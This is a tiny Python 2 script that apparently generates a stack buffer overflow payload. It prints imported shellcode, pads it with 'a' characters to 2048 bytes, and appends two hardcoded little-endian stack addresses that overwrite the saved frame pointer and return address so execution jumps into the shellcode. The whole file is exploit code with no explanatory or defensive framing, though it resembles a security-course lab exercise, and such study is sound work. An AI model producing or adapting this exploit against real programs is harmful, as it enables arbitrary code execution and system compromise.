from shellcode import shellcode
from struct import pack

print shellcode  +'a' *(2048 - len(shellcode)) + pack("<I", 0xbffeabc8) + pack("<I", 0xbffeabc8 + 0x810 + 4)
